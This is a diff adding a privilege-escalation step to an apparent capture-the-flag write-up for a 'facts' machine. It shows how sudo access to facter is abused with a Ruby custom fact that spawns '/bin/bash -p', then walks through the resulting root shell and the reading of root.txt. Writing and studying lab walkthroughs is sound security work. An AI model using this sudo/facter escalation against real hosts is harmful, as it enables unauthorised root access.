@@ -228,4 +228,36 @@ User trivia may run the following commands on facts:
 
 `sudo -l` shows us that user `trivia` can run facter via root. Facter is a lightweight, cross-platform command-line tool used in Linux (and other OSs) to collect and display system information, known as "facts," such as hardware, network settings, and operating system versions.
 
-Facter's `--custom-dir ` is notoriously abusable to allow for privilege escalation -- which can be used within the server.
+Facter's `--custom-dir ` is notoriously abusable to allow for privilege escalation -- which can be used within the Facts server. With this knowledge in hand we can craft a simple exploit.
+
+```
+trivia@facts:~$ mkdir -p /tmp/facts
+trivia@facts:~$ cat > /tmp/facts/shell.rb << 'EOF'
+Facter.add('shell') do
+  setcode do
+    system('/bin/bash -p')
+  end
+end
+EOF
+```
+
+Facter is a tool that collects system information and is commonly used with Puppet. It supports custom facts written in Ruby, which lets administrators extend it with their own data sources. The `--custom-dir` flag tells facter to load these custom Ruby files from a specific directory at runtime.
+
+When facter loads a custom fact file it evaluates the Ruby code inside it. The `setcode` block is where facter runs code to determine the fact's value. By placing a `system()` call inside `setcode`, you're telling facter to execute a shell command to "calculate" the fact -- but since it's actually just running arbitrary code, you can make it spawn a shell instead.
+
+We can then run the exploit via `sudo` with our new directory.
+
+```
+trivia@facts:~$ sudo /usr/bin/facter --custom-dir /tmp/facts shell
+root@facts:/home/trivia# 
+
+root@facts:/# ls
+bin   cdrom  etc   lib    lost+found  mnt  proc  run   snap  sys  usr
+boot  dev    home  lib64  media       opt  root  sbin  srv   tmp  var
+root@facts:/# cd root
+root@facts:~# ls
+minio-binaries  ministack  root.txt  snap
+root@facts:~# cat root.txt
+ROOT_FLAG_HERE
+root@facts:~# 
+```
